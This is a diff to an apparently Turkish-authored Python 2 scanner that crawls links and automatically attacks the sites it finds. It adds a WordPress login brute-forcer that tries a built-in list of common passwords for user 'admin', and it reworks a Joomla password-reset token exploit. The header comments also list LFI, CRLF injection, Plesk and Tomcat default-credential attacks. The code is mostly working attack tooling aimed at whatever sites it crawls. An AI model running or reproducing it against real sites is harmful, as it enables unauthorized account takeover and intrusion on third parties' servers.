@@ -16,6 +16,7 @@
 #tum linklerde php ve asp lfi dener
 #tum linklerde header crlf injection dener
 #tum linklerde login sayfalarini otomatik bulup basit capli brute gerceklestirir.
+#linklerde olan wordpressleri bulup basit capli brute force yapar.
 #linklerde olan joomlalari bulup joomla token acigini otomatik tarar
 #son zamanlarda cikan plesk 0day aciginida otomatik test eder
 #tomcat olan siteyi tespit edip default passlari authentication brute eder.
@@ -104,8 +105,81 @@ limitlinkler={}
 
 
 
-def tomcatkontrol(url):
+def wordpressbrute(url):
+    
+    
+    try:
+	yaz("Wordpress site tespit edildi "+url,True)
+	passlar=["admin",
+	                 "test",
+	                 "secret",
+	                 "guest",
+	                 "1234",
+	                 "123456",
+	                 "demo123",
+	                 "demo",
+	                 "password123",
+	                 "password1",
+	                 "qwerty",
+	                 "abc123",
+	                 "password1",
+	                 "administrator",
+	                 "12341234",
+	                 "111111",
+	                 "123456789",
+	                 "12345678",
+	                 "1234567",
+	                 "root",
+	                 "toor",
+	                 "pass123",
+	                 "pass1",
+	                 "pass2",
+	                 "pass",
+	                 "password2",
+	                 "123123",
+	                 "admin123",
+	                 "123admin"] 
+	
+    
+	openerwp = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler()) 
+	
+	for sadepass in passlar:
+	    login_form = {'log':"admin",
+		            'pwd':sadepass,
+		            'rememberme':"forever",
+		            'wp-submit':'Log In',
+		            'redirect_to':url+'/wp-admin/',
+		            'testcookie': 1}
+	    datawpencode = urllib.urlencode(login_form)
+	    
+	
+	    respwp = openerwp.open(url+"/wp-login.php", datawpencode).read()
+	
+	    if re.search('<strong>ERROR</strong>',respwp):
+		print "[#] Wordpress Login Basarisiz, Denenen : "+ sadepass
+	    elif re.search('WordPress requires Cookies', respwp):
+		print '[!] Wordpress Cookieyi okumadi.'
+	    else:
+		yaz("[#] Wordpress Login Oldu :"+url+" User:admin Sifre:"+sadepass,True)
 
+    
+    except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] Wordpress Brute Http 500 Dondu " +url,True)
+	    
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		    #yaz(mesaj)
+    except:
+	mesaj="Bilinmeyen hata olustu\n"
+			#yaz(mesaj)              
+    
+    
+
+def tomcatkontrol(url):
+	
+	yaz("Tomcat site tespit edildi "+url,True)
+	
 	kullanici=["tomcat","password","admin","admin","root","tomcat","admin"]
 	sifre=["tomcat","password","admin","password","root","s3cret","admintesting"]
 	
@@ -144,7 +218,7 @@ def pleskphppath(host):
 	    s.send("GET /phppath/php HTTP/1.0\r\n\r\n")  
 	    buf = s.recv(1024);
 	    if "500 Internal" in buf:
-		yaz("Plesk Phppath acigi bulundu "+ip,True)
+		yaz("Plesk Phppath acigi olabilir "+ip,True)
 	      
     except socket.error, msg:
 	print "Plesk testi yapilirken hata olustu "
@@ -404,29 +478,42 @@ def sqlkodcalisiomu(url):
 
 def joomlatoken(url):
     
-    print "Joomla Token acigi kontrol ediliyor..."
-    
-    datam={'token': "'"}
-    
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler()) 
-
-    sifirlamagiris=opener.open(url+"/index.php?option=com_user&view=reset&layout=confirm").read()
-    
-    md5 = re.match(r"([0-9a-f]{32})",sifirlamagiris,re.DOTALL) 
-    
-    if md5:
-	hashim=md5.group()
+    try:
+	yaz("Joomla site tespit edildi "+url,True)
+	print "Joomla Token acigi kontrol ediliyor..."
 	
-	datam[hashim]=1
+	datam={'token': "'"}
 	
-	dataencode = urllib.urlencode(datam)
+	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler()) 
+    
+	sifirlamagiris=opener.open(url+"/index.php?option=com_user&view=reset&layout=confirm").read()
 	
-	resp = opener.open(url+"/index.php?option=com_user&task=confirmreset", dataencode).read()
+	md5 = re.match(r"([0-9a-f]{32})",sifirlamagiris,re.DOTALL) 
 	
-	if "name=\"password1\"" in resp:
+	if md5:
+	    hashim=md5.group()
 	    
-	    yaz("Joomla Token acigi bulundu "+url,True)
-    
+	    datam[hashim]=1
+	    
+	    dataencode = urllib.urlencode(datam)
+	    
+	    resp = opener.open(url+"/index.php?option=com_user&task=confirmreset", dataencode).read()
+	    
+	    if "name=\"password1\"" in resp:
+		
+		yaz("Joomla Token acigi bulundu "+url,True)
+		
+    except urllib2.HTTPError,  e:
+	if(e.code==500):
+	    yaz("[#] Joomla Token Http 500 Dondu " +url,True)
+	
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		#yaz(mesaj)
+    except:
+	mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)           
+
     
 
 def execkontrol(response,urlnormal):
@@ -744,12 +831,59 @@ def indexoful(url):
 		yaz("[#] SQL DOSYASI tespit Edildi "+url,True)
     
 
+
+
+def wpmi(url):
+    
+    try:
+	wpmisource=urllib2.urlopen(url+"/wp-login.php").read()
+	
+	if "wp-submit" in wpmisource: 
+	    return True  
+	else:
+	    return False
+    
+    
+    except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] Wordpresmi Kontrol HTTP 500 Dondu " +url,True)
+		sqlkontrol(e.read(),urlnormal)
+    
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+	#yaz(mesaj)
+    except:
+	print "Normal acarken Hata oldu"    
+
+def joomlami(url):
+    try:
+	joomlamisource=urllib2.urlopen(url+"/administrator").read()
+	
+	    
+	if "mod-login-username" in joomlamisource or \
+	"modlgn_username" in joomlamisource or \
+	"com_login" in joomlamisource:
+	    return True
+	else:
+	    return False
+	
+    except urllib2.HTTPError,  e:
+		if(e.code==500):
+		    yaz("[#] Joomla Kontrol HTTP 500 Dondu " +url,True)
+		    sqlkontrol(e.read(),urlnormal)
+	
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+	#yaz(mesaj)
+    except:
+	print "Normal acarken Hata oldu"      
+
 def normalac(url):
     
     try:
      
 	ajaxtespit=["jquery.ajax","$.ajax","xmlhttprequest","msxml2.xmlhttp"]
-	socket=["websocket","ws:"]
+	socket=["new WebSocket(","ws:"]
 	
 	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
 	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
@@ -757,11 +891,24 @@ def normalac(url):
 	
 	
 	
-	if "Joomla" in response:
-	    joomlami=urllib2.urlopen(url+"/administrator").read()
-	    if "modlgn_username" in joomlami:
-		joomlatoken(url)
 	
+	
+	if "/wp-content/" in response:
+	    if wpmi(url)==True:
+		wordpressbrute(url)	
+	else:
+	    if wpmi(url)==True:
+		wordpressbrute(url)	
+		
+	    
+	
+	if "Joomla" in response:
+	    if joomlami(url)==True:
+		joomlatoken(url)
+	else:
+	    if joomlami(url)==True:
+		joomlatoken(url)	
+	    
 	
 	list=sre.findall("([0-9a-z\-_\.]+\@[0-9a-z\-_\.]+\.[0-9a-z\-_\.]+)",response)
 	if len(list)>0:
